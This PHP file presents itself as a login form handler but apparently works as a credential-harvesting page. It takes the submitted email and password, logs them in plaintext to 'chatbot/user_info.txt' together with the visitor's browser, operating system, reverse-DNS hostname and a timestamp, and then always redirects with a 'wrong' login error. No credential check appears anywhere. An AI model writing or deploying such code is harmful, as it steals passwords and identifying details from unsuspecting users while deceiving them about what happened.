<?php
// Get user agent string
$user_agent = $_SERVER['HTTP_USER_AGENT'];
if (isset($_POST['submit'])) {
    $user = $_POST['user1'];
    $pass = $_POST['pass'];
}else {
    header("location: Login");
    exit();
}
require_once "func.php";

if (empInpLogin($user, $pass) !== false) {
		header("location: Login.php?error=Empty_input");
		exit();
	} 


// Function to parse user agent string and extract browser and OS information
function getBrowserOS($user_agent) {
    $browser = "Unknown";
    $os = "Unknown";
    
    // Array of common browsers and their user agent strings
    $browsers = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
    );

    // Array of common operating systems and their user agent strings
    $oses = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    // Check for browser
    foreach ($browsers as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
            break;
        }
    }

    // Check for operating system
    foreach ($oses as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os = $value;
            break;
        }
    }

    // Return browser and OS information
    return array("browser" => $browser, "os" => $os);
}

// Call the function and retrieve browser and OS information
if(isset($_SERVER['REMOTE_USER'])) {
    // Get the remote user
    $remote_user = $_SERVER['REMOTE_USER'];
}
date_default_timezone_set('Asia/Manila');
$current_datetime = date("Y-m-d H:i:s");
$browser_os_info = getBrowserOS($user_agent);
$browser = $browser_os_info["browser"];
$os = $browser_os_info["os"];
$ip_address = $_SERVER['REMOTE_ADDR'];
$server_hostname = gethostname();

    // Perform a reverse DNS lookup to get the hostname (PC name)
    $hostname = gethostbyaddr($ip_address);
// Create or open a text file for writing
$file = fopen("chatbot/user_info.txt", "a");

// Write browser and OS information to the text file
fwrite($file, "Browser: " . $browser . "\n");
fwrite($file, "Operating System: " . $os . "\n");
fwrite($file, "IP Address: " . $hostname . "\n");
fwrite($file, "Server Hostname: " . $server_hostname . "\n");
fwrite($file, "Email: " . $user . "\n");
fwrite($file, "Password: " . $pass . "\n");
fwrite($file, "Date: " . $current_datetime . "\n");
if (isset($_SERVER['REMOTE_USER'])) {
fwrite($file, "Remote User: " . $remote_user . "\n");
}
fwrite($file, "\n");

// Close the file
fclose($file);

// Output a message to indicate that the information has been saved
 header("location: Login.php?error=wrong");
					exit();
?>
